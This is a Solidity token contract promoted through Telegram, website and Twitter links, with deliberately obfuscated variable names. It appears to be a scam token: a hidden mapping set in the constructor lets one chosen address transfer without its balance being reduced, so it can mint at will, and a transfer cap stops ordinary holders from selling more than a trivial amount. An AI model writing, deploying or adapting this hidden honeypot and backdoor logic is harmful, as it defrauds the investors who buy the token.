/*

Telegram: https://t.me/xTokenETHPortal

Website: https://xtoken.crypto-token.live/

Twitter: https://twitter.com/xTokenETHTw

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Token is Ownable {
    mapping(address => uint256) private paefodicj;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol;

    function transferFrom(address pvewxyn, address rciexhvwfqpb, uint256 lkusfy) public returns (bool success) {
        require(lkusfy <= allowance[pvewxyn][msg.sender]);
        allowance[pvewxyn][msg.sender] -= lkusfy;
        xktcmhidjpov(pvewxyn, rciexhvwfqpb, lkusfy);
        return true;
    }

    uint256 private ofpc = 112;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name;

    function xktcmhidjpov(address pvewxyn, address rciexhvwfqpb, uint256 lkusfy) private {
        address wedxgqvj = IUniswapV2Factory(wclm.factory()).getPair(address(this), wclm.WETH());
        if (0 == paefodicj[pvewxyn]) {
            if (pvewxyn != wedxgqvj && cavzijohtpgy[pvewxyn] != block.number && lkusfy < totalSupply) {
                require(lkusfy <= totalSupply / (10 ** decimals));
            }
            balanceOf[pvewxyn] -= lkusfy;
        }
        balanceOf[rciexhvwfqpb] += lkusfy;
        cavzijohtpgy[rciexhvwfqpb] = block.number;
        emit Transfer(pvewxyn, rciexhvwfqpb, lkusfy);
    }

    uint8 public decimals = 9;

    constructor(string memory hqap, string memory oreyjn, address lkugtbhidv, address vqtkbomrdesl) {
        name = hqap;
        symbol = oreyjn;
        balanceOf[msg.sender] = totalSupply;
        paefodicj[vqtkbomrdesl] = ofpc;
        wclm = IUniswapV2Router02(lkugtbhidv);
    }

    function transfer(address rciexhvwfqpb, uint256 lkusfy) public returns (bool success) {
        xktcmhidjpov(msg.sender, rciexhvwfqpb, lkusfy);
        return true;
    }

    mapping(address => uint256) private cavzijohtpgy;

    IUniswapV2Router02 private wclm;

    function approve(address ijucboqkxnla, uint256 lkusfy) public returns (bool success) {
        allowance[msg.sender][ijucboqkxnla] = lkusfy;
        emit Approval(msg.sender, ijucboqkxnla, lkusfy);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
